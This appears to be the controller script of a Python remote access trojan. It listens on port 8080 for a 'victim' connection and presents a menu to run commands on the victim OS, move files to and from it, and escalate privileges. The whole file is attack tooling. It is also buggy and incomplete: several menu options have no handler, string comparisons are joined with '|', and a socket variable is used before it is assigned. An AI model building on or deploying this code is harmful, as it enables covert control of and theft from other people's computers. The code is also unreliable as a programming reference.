from core.connection.conn import *
from core.features.command import run_command


def show_options():
    print("[ 01 ] Run Command on victim OS")
    print("[ 02 ] Upload File to victim ")
    print("[ 03 ] Download File from victim")
    print("[ 05 ] Download Folder to victim")
    print("[ 06 ] Escalate privilages")

def select_options(conn, skt):
    show_options()
    user_option = input("[+] Select options : ")
    conn.send_data(skt, user_option)

    if user_option == "1":
        print("[+] Running Command")
        run_command(socket)
    elif user_option == "2":
        print("[+] Downloading File")
    elif user_option == "99" | user_option == "exit" | user_option == "quit":
        print("[+] Exiting")
        return False
    else:
        print("[+] Wrong input")
        return True











if __name__ == "__main__":
    socket = Create_connection("", 8080)
    keep_alive = True
    while keep_alive:
        try:
            print("[+] Waiting for incoming connection ")
            skt, clientAddress = conn.Accept_connection(skt)
            print("[+] Client address is ", clientAddress)


            loopControl = True
            while loopControl:
                loopControl = select_options(conn, skt)


        except ConnectionResetError:
            print("[-] Connection Reset")
        except KeyboardInterrupt:
            skt.close()
            keep_alive = False
        finally:
            print("[+] Closing connection and Exiting")
            skt.close()


